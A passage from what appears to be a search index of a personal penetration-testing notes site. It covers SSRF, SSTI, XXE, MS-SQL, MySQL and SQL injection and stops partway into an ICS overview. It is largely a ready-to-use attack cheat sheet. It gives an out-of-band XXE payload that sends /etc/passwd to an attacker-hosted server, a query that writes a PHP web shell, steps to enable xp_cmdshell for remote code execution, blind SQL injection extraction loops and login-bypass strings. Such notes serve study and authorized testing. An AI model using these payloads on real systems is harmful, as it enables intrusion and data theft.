--method POST --random-agent --data \"field1=*&amp;field2=*&amp;field3=*\" -p \"field3\"\n\n\n# Fuzzing GET Parameter\nwfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -u \"$URL/index.php?id=FUZZ\"\n\n# Fuzzing POST Parameter\nwfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d \"id=FUZZ\" -u \"$URL/index.php\"\n</code></pre>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/Server-Side%20Request%20Forgery%20%28SSRF%29/","title":"Server Side Request Forgery (SSRF)","text":"<p>Info</p> <p>This note is still in development.</p>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/Server-Side%20Request%20Forgery%20%28SSRF%29/#overview","title":"Overview","text":"<p>Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf.</p> <p>Reference(s): - https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Request%20Forgery/ - https://portal.offsec.com/courses/web-200/books-and-videos/modal/modules/server-side-request-forgery/server-side-request-forgery</p>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/Server-Side%20Request%20Forgery%20%28SSRF%29/#tools","title":"Tools","text":"<ul> <li> <p>SSRFmap <pre><code># Installation\ngit clone https://github.com/swisskyrepo/SSRFmap\ncd SSRFmap\npip3 install -r requirements.txt\n\n# Usage\npython ./ssrfmap.py\n</code></pre></p> </li> <li> <p>See-SURF <pre><code># Installation\ngit clone https://github.com/In3tinct/See-SURF.git\ncd See-SURF/\npip3 install BeautifulSoup4\npip3 install requests\n\n# Usage\npython ./see-sruf.py -H &lt;url&gt;\n</code></pre></p> </li> <li> <p>Once SSRF is validated, search for potential backend services normally only available on localhost</p> </li> </ul> Service Port URI Path MySQL 3306 mysql://127.0.0.1:3306 PostgreSQL 5432 postgresql://localhost:5432 FastCGI 9000 Redis 6379 Zabbix 10050 SMTP 25"},{"location":"Red%20Cell/11.%20Web%20Exploitation/Server-Side%20Template%20Injection%20%28SSTI%29/","title":"Server Side Template Injection (SSTI)","text":"<p>Info</p> <p>This note is still in development.</p>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/Server-Side%20Template%20Injection%20%28SSTI%29/#overview","title":"Overview","text":"<p>Template injection allows an attacker to include template code into an existing (or not) template. A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages</p> <p>Reference(s): - https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/ - https://portal.offsec.com/courses/web-200/books-and-videos/modal/modules/server-side-template-injection-discovery-and-exploitation/server-side-template-injection-discovery-and-exploitation</p>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/Server-Side%20Template%20Injection%20%28SSTI%29/#tools","title":"Tools","text":"<ul> <li> <p>tplmap <pre><code># Installation\ngit clone https://github.com/epinna/tplmap\ncd tplmap\npip install -r requirements.txt\n\n# Usage\npython ./tplmap.py -u '&lt;url&gt;'\n</code></pre></p> </li> <li> <p>SSTImap <pre><code># Installation\ngit clone https://github.com/vladko312/SSTImap\ncd SSTImap\npip install -r requirements.txt\n\n# Usage\npython ./sstimap.py -u '&lt;url&gt;'\n</code></pre></p> </li> </ul>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/Server-Side%20Template%20Injection%20%28SSTI%29/#other","title":"Other","text":"<p> - Common Templating Engines</p>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/Server-Side%20Template%20Injection%20%28SSTI%29/#discovery","title":"Discovery","text":"<pre><code>{{7*7}}\n${7*7}\n&lt;%= 7*7 %&gt;\n${{7*7}}\n#{7*7}\n</code></pre>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/Server-Side%20Template%20Injection%20%28SSTI%29/#exploitation","title":"Exploitation","text":""},{"location":"Red%20Cell/11.%20Web%20Exploitation/XML%20External%20Entity%20%28XXE%29%20Injection/","title":"XML External Entity (XXE) Injection","text":"<p>Info</p> <p>This note is still in development.</p>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/XML%20External%20Entity%20%28XXE%29%20Injection/#overview","title":"Overview","text":"<p>An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.</p> <ul> <li>Reference(s):<ul> <li>PayloadsAllTheThings: XXE Injection</li> </ul> </li> </ul>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/XML%20External%20Entity%20%28XXE%29%20Injection/#discovery","title":"Discovery","text":"<p>There are several ways we can import or export XML. Not all applications that handle XML data will have such prominent pages highlighting XML data sources. However, due to XML's natural structure and tags (using \"&lt;\" and \"&gt;\"), we can easily identify XML data within HTTP requests or responses with Burp Suite.</p> <p></p> <p>Preface entity-engine / root tag with XXE code we intend to inject. <pre><code>&lt;!DOCTYPE data [\n&lt;!ELEMENT data ANY &gt;\n&lt;!ENTITY xxe \"Vulnerable to XXE\"&gt;\n]&gt;\n</code></pre></p> <p></p> <p>Within the entity-engine code, have a standard item, but with a single field injected. <pre><code>&lt;Product \n  createdStamp=\"2021-06-04 08:15:49.363\" \n  createdTxStamp=\"2021-06-04 08:15:48.983\" \n  description=\"Giant Widget with Wheels\" \n  internalName=\"Giant Widget variant explosion\" \n  isVariant=\"N\" \n  isVirtual=\"Y\" \n  largeImageUrl=\"/images/products/WG-9943/large.png\" \n  lastUpdatedStamp=\"2021-06-04 08:16:18.521\" \n  lastUpdatedTxStamp=\"2021-06-04 08:16:18.258\" \n  primaryProductCategoryId=\"202\" \n  productId=\"XXE-0001\" \n  productName=\"Giant Widget with variant explosion\" \n  productTypeId=\"FINISHED_GOOD\" \n  productWeight=\"22.000000\" \n  quantityIncluded=\"10.000000\" \n  smallImageUrl=\"/images/products/WG-9943/small.png\"   \n  virtualVariantMethodEnum=\"VV_VARIANTTREE\"\n&gt;\n  &lt;longDescription&gt;&amp;xxe;&lt;/longDescription&gt;\n&lt;/Product&gt;\n</code></pre></p> <p>If the XXE was successful, we should be able to find an new object with our XXE payload.</p> <p></p>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/XML%20External%20Entity%20%28XXE%29%20Injection/#exploitation","title":"Exploitation","text":"<p>Variable to inject:</p> <pre><code>&lt;field_name&gt;%xxe;&lt;/field_name&gt;\n</code></pre> <p>Payloads to inject:</p> <ul> <li> <p>Inject String <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; \n&lt;!DOCTYPE data [\n    &lt;!ELEMENT data ANY &gt;\n    &lt;!ENTITY xxe1 \"Vulnerable to XXE!!!\"&gt;\n    &lt;!ENTITY xxe2 \"This is a second inject!\"&gt;\n]&gt;\n</code></pre></p> </li> <li> <p>Local File Inclusion <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; \n&lt;!DOCTYPE data [\n    &lt;!ELEMENT data ANY &gt;\n    &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;\n]&gt;\n</code></pre></p> </li> <li> <p>Out-of-Band pointing to hosted payload (<code>external.dtd</code>). <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; \n&lt;!DOCTYPE oob [\n    &lt;!ENTITY % base SYSTEM \"http://&lt;ip_addr&gt;/external.dtd\"&gt; \n    %base;\n    %external;\n    %exfil;\n]&gt;\n</code></pre></p> </li> <li> <p>Hosted Payload (<code>external.dtd</code>) <pre><code>&lt;!ENTITY % content SYSTEM \"file:///etc/passwd\"&gt;\n&lt;!ENTITY % external \"&lt;!ENTITY &amp;#37; exfil SYSTEM 'http://&lt;ip_addr&gt;/xxe?content=%content;'&gt;\" &gt;\n</code></pre></p> </li> </ul>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/XML%20External%20Entity%20%28XXE%29%20Injection/#error-based-exploitation","title":"Error-Based Exploitation","text":"<p>In scenarios where we can't interact directly with the created object, we may be able to return sensitive information within error messages, assuming the application returns verbose error messages.</p> <ul> <li> <p>Syntax error when attempting to inject a timestamp indicates that Java is being used. <pre><code>  &lt;createdStamp&gt;&amp;xxe;&lt;/createdStamp&gt;\n  &lt;longDescription&gt;Bruh&lt;/longDescription&gt;\n</code></pre> </p> </li> <li> <p>Moved a field out of the body and attempted a field length error (<code>/etc/password</code> LFI payload) <pre><code>  &lt;description&gt;&amp;xxe;&lt;/description&gt;\n  &lt;createdStamp&gt;2021-06-04 08:15:49&lt;/createdStamp&gt;\n  &lt;longDescription&gt;Bruh&lt;/longDescription&gt;\n</code></pre></p> </li> <li> <p>If a file is not long enough to cause an error, we can concatenate strings to print the flag followed by excessive data to surpass field length. <pre><code>&lt;!DOCTYPE data [\n    &lt;!ELEMENT data ANY &gt;\n    &lt;!ENTITY xxe1 SYSTEM \"file:///root/error.txt\"&gt;\n    &lt;!ENTITY xxe2 SYSTEM \"file:///etc/passwd\"&gt;\n]&gt;\n&lt;root&gt;\n    &lt;description&gt;&amp;xxe1;&amp;xxe2;&lt;/description&gt;\n&lt;/root&gt;\n</code></pre> </p> </li> </ul>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/XML%20External%20Entity%20%28XXE%29%20Injection/#out-of-band-exploitation","title":"Out-of-Band Exploitation","text":"<p>In scenarios where we can't interact directly with the created object nor view verbose error messages, we may be able to return information via an out-of-band attack that leverages the functionality that loads the external resources.</p> <ul> <li>For this attack to work, we will need to create and host our own DTD file (external.dtd) that contains two entities. We will need to use parameter entities because we need the entities to be processed within the DTD so that they can impact each other.</li> </ul> <p>external.dtd <pre><code>&lt;!ENTITY % content SYSTEM \"file:///etc/passwd\"&gt;\n&lt;!ENTITY % external \"&lt;!ENTITY &amp;#37; exfil SYSTEM 'http://&lt;ip_addr&gt;/xxe?content=%content;'&gt;\" &gt;\n</code></pre></p> <ul> <li>Out-of-Band stager pointing to hosted payload. <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; \n&lt;!DOCTYPE oob [\n    &lt;!ENTITY % base SYSTEM \"http://&lt;ip_addr&gt;/external.dtd\"&gt; \n    %base;\n    %external;\n    %exfil;\n]&gt;\n</code></pre> </li> </ul>"},{"location":"Red%20Cell/12.%20SQL/","title":"SQL","text":"<ul> <li>SQL, or Structured Query Language, is a domain-specific programming language used for managing and manipulating relational databases, allowing for tasks like data retrieval, modification, and administration.</li> </ul>"},{"location":"Red%20Cell/12.%20SQL/#table-of-contents","title":"Table of Contents","text":"<ul> <li>MS-SQL</li> <li>MySQL</li> <li>SQL Injection</li> </ul>"},{"location":"Red%20Cell/12.%20SQL/MS-SQL/","title":"MS SQL","text":""},{"location":"Red%20Cell/12.%20SQL/MS-SQL/#overview","title":"Overview","text":"<p>Microsoft SQL Server (MS-SQL) is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications\u2014which may run either on the same computer or on another computer across a network (including the Internet).</p> <ul> <li>Default Port: 1433</li> </ul>"},{"location":"Red%20Cell/12.%20SQL/MS-SQL/#usage","title":"Usage","text":""},{"location":"Red%20Cell/12.%20SQL/MS-SQL/#connecting-to-databases","title":"Connecting to Databases","text":"<p>Info</p> <p>For more uses of the impacket library, see my Impacket Cheatsheet.</p> <ul> <li>The <code>impacket</code> Python library is incredibly powerful, and contains a tool for connecting to MSSQL databases.</li> </ul> <pre><code># Connect to MS-SQL Server\nimpacket-mssqlclient &lt;username&gt;:'&lt;password&gt;'@&lt;target&gt;\n\n# Connect to MS-SQL Server via default SA creds\nimpacket-mssqlclient sa:'poiuytrewq'@&lt;target&gt;\n</code></pre> <p></p>"},{"location":"Red%20Cell/12.%20SQL/MS-SQL/#commands","title":"Commands","text":"<pre><code>-- Get version\nselect @@version;\n-- Get databases\nSELECT name FROM master.dbo.sysdatabases;\n-- Use database\nUSE &lt;database&gt;\n-- Get tables\nSELECT * FROM &lt;database&gt;.INFORMATION_SCHEMA.TABLES;\n\n-- Get user\nselect user_name();\n-- Get members of the role sysadmin\nUSE master\nEXEC sp_helpsrvrolemember 'sysadmin';\n-- Get if the current user is sysadmin\nSELECT IS_SRVROLEMEMBER('sysadmin');\n-- Get users that can run xp_cmdshell\nUSE master\nEXEC sp_helprotect 'xp_cmdshell'\n\n-- List Linked SQL Servers\nEXEC sp_linkedservers\nSELECT * FROM sys.servers;\n</code></pre>"},{"location":"Red%20Cell/12.%20SQL/MS-SQL/#comments","title":"Comments","text":"<pre><code>-- This is a single-line comment\n\n/*\nThis is a multi-line comment\n*/\n</code></pre>"},{"location":"Red%20Cell/12.%20SQL/MS-SQL/#default-admin-credentials","title":"Default Admin Credentials","text":"<pre><code># Default SQL Server system administrator account\nUsername: sa\nPassword: poiuytrewq\n</code></pre>"},{"location":"Red%20Cell/12.%20SQL/MS-SQL/#xp_cmdshell","title":"xp_cmdshell","text":"<ul> <li><code>xp_cmdshell</code> is the most common way of establishing code execution via MS-SQL.  By default it is disabled for security, but with the right privileges we can easily enable it.</li> </ul> <p>Per Microsoft documentation, here is how to utilize <code>sp_configure</code> to enable <code>xp_cmdshell</code></p> <p></p> <p>Once <code>xp_cmdshell</code> is enabled, you can execute code on the SQL server.</p> <pre><code># Enable XP_CMDSHELL for Remote Code Exection\n&gt; EXECUTE sp_configure 'show advanced options', 1;\n&gt; RECONFIGURE;\n&gt; EXECUTE sp_configure 'xp_cmdshell', 1;\n&gt; RECONFIGURE;\n&gt; xp_cmdshell '&lt;command&gt;'\n\n# Enable XP_CMDSHELL for Remote Code Exection (one-liner)\nEXECUTE sp_configure 'show advanced options', 1; RECONFIGURE; EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;\n</code></pre> <p></p>"},{"location":"Red%20Cell/12.%20SQL/MS-SQL/#privilege-escalation","title":"Privilege Escalation","text":"<p>The user running MS-SQL server will often have enabled the privilege token <code>SeImpersonatePrivilege</code> -- this means we can exploit this privilege using one of the many exploits in the potato family to elevate to \"NT AUTHORITY/SYSTEM\"</p> <ul> <li>Common Potatoes Exploiting \"SeImpersonatePrivilege\":<ul> <li>https://github.com/tylerdotrar/SigmaPotato (plugging my own repository)</li> <li>https://github.com/BeichenDream/GodPotato</li> <li>https://github.com/itm4n/PrintSpoofer</li> <li>https://github.com/zcgonvh/EfsPotato</li> </ul> </li> </ul> <p>Info</p> <p>For SeImpersonatePrivilege exploitation, read the note in my Privilege Escalation section.</p>"},{"location":"Red%20Cell/12.%20SQL/MS-SQL/#other","title":"Other","text":"<p>(Thank you @numonce)</p>"},{"location":"Red%20Cell/12.%20SQL/MS-SQL/#nmap","title":"Nmap","text":"<pre><code>nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 &lt;IP&gt;\n</code></pre>"},{"location":"Red%20Cell/12.%20SQL/MS-SQL/#sqsh","title":"sqsh","text":"<ul> <li><code>sqsh</code> is an interactive ms-sql client that is installed on kali by default. When used in conjunction with <code>xp_cmdshell</code> we can execute arbitrary PowerShell and cmd commands. </li> </ul>"},{"location":"Red%20Cell/12.%20SQL/MS-SQL/#python","title":"Python","text":"<ul> <li>Some versions of ms-sql allow you to execute inline python or R scripts. <pre><code># Print the user being used (and execute commands)\nEXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__(\"getpass\").getuser())'\nEXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__(\"os\").system(\"whoami\"))'\n#Open and read a file\nEXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open(\"C:\\\\inetpub\\\\wwwroot\\\\web.config\", \"r\").read())'\n#Multiline\nEXECUTE sp_execute_external_script @language = N'Python', @script = N'\nimport sys\nprint(sys.version)\n'\nGO\n</code></pre></li> </ul>"},{"location":"Red%20Cell/12.%20SQL/MySQL/","title":"MySQL","text":""},{"location":"Red%20Cell/12.%20SQL/MySQL/#overview","title":"Overview","text":"<p>MySQL is an open-source relational database management system. It is widely used for storing and managing data in various applications, providing a robust and scalable solution for database needs.</p> <ul> <li>Default Port: 3306</li> </ul>"},{"location":"Red%20Cell/12.%20SQL/MySQL/#usage","title":"Usage","text":""},{"location":"Red%20Cell/12.%20SQL/MySQL/#connecting-to-databases","title":"Connecting to Databases","text":"<pre><code># Connect to a local database (prompt for password)\nmysql -u &lt;username&gt; -p\n\n# Connect to a remote database (prompt for password)\nmysql -h &lt;ip_addr&gt; -u &lt;username&gt; -p\n\n# Connect to a remote database port forwarded to 127.0.0.1:3306\nmysql -h 127.0.0.1 -u &lt;username&gt; -p\n</code></pre>"},{"location":"Red%20Cell/12.%20SQL/MySQL/#commands","title":"Commands","text":"<pre><code>-- General Usage\nshow databases;\nuse &lt;database&gt;;\nshow tables;\ndescribe &lt;table&gt;;\nshow columns from &lt;table&gt;;\nselect * from &lt;table&gt;;\nselect &lt;column&gt;,&lt;column&gt;,&lt;column&gt; from &lt;table&gt;;\n\n-- Read File (need FILE privileges to read/write to files)\nselect load_file('/etc/passwd');\n\n-- Write File (need FILE privileges to read/write to files)\nselect 1,2,\"Hello World\",4 into OUTFILE '/tmp/testing.txt'\n\n-- Advanced: Write a PHP reverse shell to an LFI Location\nselect 1,2,\"&lt;?php echo shell_exec($_GET['c']);?&gt;\",4 into OUTFILE 'C:/xampp/htdocs/revshell.php'\n-- Attacker then navigates to 'http://&lt;ip_addr&gt;:&lt;port&gt;/revshell.php'\n</code></pre>"},{"location":"Red%20Cell/12.%20SQL/MySQL/#comments","title":"Comments","text":"<pre><code>-- This is a single-line comment\n\n/*\nThis is a multi-line comment\n*/\n</code></pre>"},{"location":"Red%20Cell/12.%20SQL/SQL%20Injection/","title":"SQL Injection","text":"<p>(Thank you @numonce)</p> <p>Info</p> <p>This guide would be entirely too long if the goal were to teach SQL, so instead it will be be broken down to detection and cheetsheet. </p>"},{"location":"Red%20Cell/12.%20SQL/SQL%20Injection/#overview","title":"Overview","text":"<p>SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior. In some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure.</p> <ul> <li>Example: <pre><code># Target Backend Code\nselect * from users where name = 'tom' and password = 'P@ssw0rd!';\n\n# Injection: tom' or 1=1#\n\n# Authentication Bypass\nselect * from users where name = 'tom' or 1=1;#' and password = 'jones';\n</code></pre></li> </ul>"},{"location":"Red%20Cell/12.%20SQL/SQL%20Injection/#entry-point-detection","title":"Entry Point Detection","text":"<p>You may have found a site that is apparently vulnerable to SQLi just because the server is behaving weird with SQLi related inputs. Therefore, the first thing you need to do is how to inject data in the query without breaking it. To do so you first need to find how to escape from the current context.</p> <ul> <li>These are some useful examples: <pre><code> [Nothing]\n'\n\"\n`\n')\n\")\n`)\n'))\n\"))\n`))\n</code></pre></li> </ul> <p>Then, you need to know how to fix the query so there isn't errors. In order to fix the query you can input data so the previous query accept the new data, or you can just input your data and add a comment symbol add the end.</p> <pre><code># Backend Code\nselect * from users where name = 'tom' and password = 'jones';\n\n# Injection: tom' or 1=1;#\n\n# Authentication Bypass\nselect * from users where name = 'tom' or 1=1;#' and password = 'jones';\n</code></pre> <p>This cheatsheet should NOT be considered as reference but guide to built on, some of the examples below will require modification(s) such as url encode, comments, etc. Before we continue here is couple good to know SQL functions</p> <pre><code>limit &lt;row offset&gt;,&lt;number of rows&gt;            # display rows based on offset and number  \n\ncount(*)                                       # display number of rows  \n\nrand()                                         # generate random number between 0 and 1 \n\nfloor(rand()*&lt;number&gt;)                         # print out number part of random decimal number \n\nselect(select database());                     # double query (nested) using database() as an example \n\ngroup by &lt;column name&gt;                         # summerize rows based on column name  \n\nconcat(&lt;string1&gt;, &lt;string2&gt;, ..)               # concatenate strings such as tables, column names  \n\nlength(&lt;string&gt;)                               # calculate the number of characters for given string \n\nsubstr(&lt;string&gt;,&lt;offset&gt;,&lt;characters length&gt;)  # print string character(s) by providing offset and length \n\nascii(&lt;character&gt;)                             # decimal representation of the character \n\nsleep(&lt;number of seconds&gt;)                     # go to sleep for &lt;number of seconds&gt;\n\nif(&lt;condition&gt;,&lt;true action&gt;,&lt;false action&gt;)   # conditional if statement \n\nlike \"&lt;string&gt;%\"                               # checks if provided string present\n\noutfile \"&lt;url to file&gt;\"                        # dump output of select statement into a file\n\nload_file(\"&lt;url to file&gt;\")                     # dump the content of file\n</code></pre>"},{"location":"Red%20Cell/12.%20SQL/SQL%20Injection/#examples","title":"Examples","text":"<p>Now comes the fun part, here's combination of error, union, blind SQL command injection examples.</p> <p>Determine back-end query number of columns with error-based string SQL command injection <pre><code>http://meh.com/index.php?id=1 order by &lt;number&gt;\n</code></pre></p> <p>Determine back-end query number of columns by observing <code>http response size</code> with <code>wfuzz</code> in error-based integer SQL command injection <pre><code>wfuzz -c -z range,1-10 \"http://meh.com/index.php?id=1 order by FUZZ\"\n</code></pre></p> <p>Identify webpage printable union columns by providing false value to back-end query with error-based integer SQL command injection. This injection depends on number of columns identified by <code>order by</code> clause <pre><code>http://meh.com/index.php?id=-1 union select &lt;number of columns seperated by comma&gt;\n</code></pre></p> <p>Dump the content of table into the filesystem <pre><code>http://meh.com/index.php?id=-1')) union select &lt;column1&gt;,&lt;column2&gt; from &lt;table name&gt; into outfile \"&lt;url to file&gt;\" --+\n</code></pre></p> <p>Print back-end SQL version with error-based integer SQL command injection, assuming column 3 content gets diplayed on webpage <pre><code>http://meh.com/index.php?id=-1 union select 1,2,@@version,4,...\n</code></pre></p> <p>Print user running the query to access back-end database server with error-based integer SQL command injection <pre><code>http://meh.com/index.php?id=-1 union select 1,2,user(),4,...\n</code></pre></p> <p>Print database name with error-based integer SQL command injection <pre><code>http://meh.com/index.php?id=-1 union select 1,2,database(),4,...\n</code></pre></p> <p>Print database directory with error-based integer SQL command injection <pre><code>http://meh.com/index.php?id=-1 union select 1,2,@@datadir,4,...\n</code></pre></p> <p>Print table names with error-based integer SQL command injection <pre><code>http://meh.com/index.php?id=-1 union select 1,2,group_concat(table_name),4,... from information_schema.tables where table_schema=database()\n</code></pre></p> <p>Print column names with error-based integer SQL command injection <pre><code>http://meh.com/index.php?id=-1 union select 1,2,group_concat(column_name),4,... from information_schema.columns where table_name='&lt;table name&gt;'\n</code></pre></p> <p>Print content of column with error-based integer SQL command injection  <pre><code>http://meh.com/index.php?id=-1 union select 1,2,group_concat(&lt;column name&gt;),4,... from &lt;table name&gt;\n</code></pre></p> <p>Use <code>and</code> statement as substitute to reqular comments such as <code>--+</code>, <code>#</code>, and <code>/* */</code> with error-based string SQL command injection <pre><code>http://meh.com/index.php?id=1' &lt;sqli here&gt; and '1\n</code></pre> Determine database name with boolean-based blind SQL injection with <code>substr()</code> <pre><code>http://meh.com/index.php?id=1' and (substr(database(),&lt;offset&gt;,&lt;character length&gt;))='&lt;character&gt;' --+\n</code></pre></p> <p>Determine database name with boolean-based blind SQL injection by observing <code>http response size</code> with combination of <code>substr()</code> and <code>wfuzz</code>, assuming database name does not include special characters <pre><code>for i in $(seq 1 10); do wfuzz -c -z list,a-b-c-d-e-f-g-h-i-j-k-l-m-n-o-p-q-r-s-t-u-v-w-x-y-z --hw=&lt;word count&gt; \"http://meh.com/index.php?id=1' and (substr(database(),$i,1))='FUZZ' --+\";done \n</code></pre> Determine database name with boolean-based blind SQL injection by observing <code>http response size</code> with <code>substr()</code>, <code>ascii()</code> and <code>wfuzz</code>. The below range is the standard ASCII characters (32-127)  <pre><code>for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=&lt;word count&gt; \"http://meh.com/index.php?id=1' and (ascii(substr(database(),$i,1)))=FUZZ --+\";done \n</code></pre></p> <p>Determine table name with boolean-based blind SQL injection by observing <code>http response size</code> with <code>substr()</code>, <code>ascii()</code>, and <code>wfuzz</code>.The below range is the standard ASCII characters (32-127)  <pre><code>for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=&lt;word count&gt; \"http://meh.com/index.php?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),$i,1)))=FUZZ --+\";done # increment limit first argument by 1 to get the next available table name \n</code></pre></p> <p>Determine column name with boolean blind-based SQL injection by observing <code>http response size</code> with <code>substr()</code>, <code>ascii()</code>, and <code>wfuzz</code>. The below range is the standard ASCII characters (32-127)  <pre><code>for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=&lt;word count&gt; \"http://meh.com/index.php?id=1' and (ascii(substr((select column_name from information_schema.columns where table_name=&lt;table name&gt; limit 0,1),$i,1)))=FUZZ --+\";done # increment limit first argument by 1 to get the next available column name \n</code></pre> Boolean-based blind SQL command injection demo</p> <p></p> <p>Confirm time-based blind SQL injection using <code>sleep()</code> function <pre><code>http://meh.com/index.php?id=1' and sleep(10) --+\n</code></pre></p> <p>Determine database version with time-based blind SQL injection using <code>sleep()</code>, <code>like\"\"</code>, and conditional <code>if</code>, assuming the back-end database is running version 5 <pre><code>http://meh.com/index.php?id=1' and if((select version()) like \"5%\", sleep(10), null) --+\n</code></pre></p> <p>Determine database name with time-based blind SQL injection by observing <code>http response time</code> with <code>substr()</code>, <code>ascii()</code>, and <code>wfuzz</code>.The below range is the standard ASCII characters (32-127) <pre><code>for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 \"http://meh.com/index.php?id=1' and if((ascii(substr(database(),$i,1)))=FUZZ, sleep(10), null) --+\";done &gt; &lt;filename.txt&gt; &amp;&amp; grep \"0m9\" &lt;filename.txt&gt;\n</code></pre></p> <p>Determine table name with time-based blind SQL injection by observing <code>http response time</code> with <code>substr()</code>, <code>ascii()</code>, <code>if</code>, and <code>wfuzz</code>.The below range is the standard ASCII characters (32-127) <pre><code>for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 \"http://meh.com/index.php?id=1' and if((select ascii(substr(table_name,$i,1))from information_schema.tables where table_schema=database() limit 0,1)=FUZZ, sleep(10), null) --+\";done &gt; &lt;filename.txt&gt; &amp;&amp; grep \"0m9\" &lt;filename.txt&gt; # increment limit first argument by 1 to get the next available table name \n</code></pre> Determine column name with time-based blind SQL injection by observing <code>http response time</code> with <code>substr()</code>, <code>ascii()</code>, <code>if</code>, and <code>wfuzz</code>.The below range is the standard ASCII characters (32-127) <pre><code>for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 \"http://meh.com/index.php?id=1' and if((select ascii(substr(column_name,$i,1))from information_schema.columns where table_name='&lt;table name&gt;' limit 0,1)=FUZZ, sleep(10), null) --+\";done &gt; &lt;filename.txt&gt; &amp;&amp; grep \"0m9\" &lt;filename.txt&gt; # increment limit first argument by 1 to get the next available column name \n</code></pre></p> <p>Extract column content with time-based blind SQL injection by observing <code>http response time</code> with <code>substr()</code>, <code>ascii()</code>, <code>if</code>, and <code>wfuzz</code>.The below range is the standard ASCII characters (32-127) <pre><code>for i in $(seq 1 10); do wfuzz -v -c -z range,0-10 -z range,32-127 \"http://meh.com/index.php?id=1' and if(ascii(substr((select &lt;column name&gt; from &lt;table name&gt; limit FUZZ,1),$i,1))=FUZ2Z, sleep(10), null) --+\";done &gt; &lt;filename.txt&gt; &amp;&amp; grep \"0m9\" &lt;filename.txt&gt; # change &lt;column name&gt; to get the content of next column\n</code></pre> Time-based blind SQL command injection with bash magic demo</p> <p></p> <p>Hope those were helpfull! Now here's couple login bypass commands that worked for me <pre><code>meh' OR 3=3;#\nmeh' OR 2=2 LIMIT 1;#\nmeh' OR 'a'='a\nmeh' OR 1=1 --+\n</code></pre> Sometimes you'll run into Microsoft SQL server that have <code>xp_cmdshell</code> turned on, here's syntax for remote code execution <pre><code>meh' exec master..xp_cmdshell '&lt;command here&gt;' --\n</code></pre></p>"},{"location":"Red%20Cell/13.%20Industrial%20Control%20Systems%20%28ICS%29/","title":"Industrial Control Systems (ICS)","text":"<ul> <li>ICS, or Industrial Control Systems, encompasses various types of control systems used in industrial and critical infrastructure settings. These systems are designed to control and monitor physical processes, machinery, and devices.</li> </ul>"},{"location":"Red%20Cell/13.%20Industrial%20Control%20Systems%20%28ICS%29/#table-of-contents","title":"Table of Contents","text":"<ul> <li>ICS Overview</li> </ul>"},{"location":"Red%20Cell/13.%20Industrial%20Control%20Systems%20%28ICS%29/#vendors","title":"Vendors","text":"<ul> <li>Allen-Bradley</li> <li>Siemens</li> </ul>"},{"location":"Red%20Cell/13.%20Industrial%20Control%20Systems%20%28ICS%29/ICS%20Overview/","title":"ICS Overview","text":""},{"location":"Red%20Cell/13.%20Industrial%20Control%20Systems%20%28ICS%29/ICS%20Overview/#terminology","title":"Terminology","text":"<ul> <li> <p>ICS (Industrial Control System) is a broad term that encompasses various types of control systems used in industrial and critical infrastructure settings. These systems are designed to control and monitor physical processes, machinery, and devices. ICS includes different components, such as PLCs, RTUs, and HMIs.</p> </li> <li> <p>SCADA (Supervisory Control and Data Acquisition) is a subset of ICS. It typically operates at a higher level and provides centralized control and monitoring capabilities. SCADA systems collect data from sensors and control devices located in the field, such as PLCs and RTUs. They use network communication to transmit this data to a central location. SCADA software visualizes the data and allows operators to control processes remotely. SCADA systems often include HMI components.</p> </li> <li> <p>PLC (Programmable Logic Controller) is a ruggedized industrial computer designed to control manufacturing processes and machines. It operates by receiving input data from sensors and switches, executing a control program based on user-defined logic, and then providing output commands to control machinery or processes. PLCs are commonly used in manufacturing and industrial settings for tasks like automation, data collection, and machine control.</p> </li> <li> <p>HMI (Human Machine Interface) is a software or hardware interface that allows human operators to interact with machines, systems, and processes. It typically provides a visual representation of the process being controlled, often through graphical elements like displays, charts, and alarms. HMIs enable operators to monitor and control processes, set parameters, and 